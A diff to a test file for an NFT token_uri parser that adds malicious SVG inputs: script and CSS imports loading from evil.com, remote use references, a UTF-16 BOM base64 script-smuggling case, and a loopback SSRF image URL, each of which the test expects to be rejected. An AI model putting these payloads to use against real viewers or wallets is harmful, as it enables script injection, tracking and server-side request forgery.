@@ -59,6 +59,9 @@ describe("SEP-50 Soroban NFT token_uri parser", () => {
       '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#x6a;avascript:alert(1)"><rect/></a></svg>',
       '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://evil.com/track.png"/></svg>',
       '<svg xmlns="http://www.w3.org/2000/svg"><a href="data:text/html,<script>alert(1)</script>"><rect/></a></svg>',
+      '<svg xmlns="http://www.w3.org/2000/svg"><script/xlink:href="https://evil.com/x.js"/></svg>',
+      '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://evil.com/a.css");</style><rect/></svg>',
+      '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.com/defs.svg#icon"/></svg>',
     ];
     for (const svg of vectors) {
       const b64 = Buffer.from(svg, "utf8").toString("base64");
@@ -69,6 +72,26 @@ describe("SEP-50 Soroban NFT token_uri parser", () => {
       );
       expect(parsed.image).toBeUndefined();
     }
+
+    // Reject UTF-16 BOM base64 SVG smuggling
+    const utf16BomSvg = Buffer.concat([
+      Buffer.from([0xff, 0xfe]),
+      Buffer.from("<svg><script>alert(1)</script></svg>", "utf16le"),
+    ]).toString("base64");
+    const bomParsed = parseSep50TokenUri(
+      SAMPLE_CONTRACT,
+      11,
+      JSON.stringify({ name: "BOM Evil", image: `data:image/svg+xml;base64,${utf16BomSvg}` }),
+    );
+    expect(bomParsed.image).toBeUndefined();
+
+    // Reject private/local https image URLs
+    const localImgParsed = parseSep50TokenUri(
+      SAMPLE_CONTRACT,
+      11,
+      JSON.stringify({ name: "Local SSRF", image: "https://127.0.0.1/evil.png" }),
+    );
+    expect(localImgParsed.image).toBeUndefined();
 
     const safeSvg =
       '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="grad1"/></defs><rect fill="url(#grad1)"/></svg>';
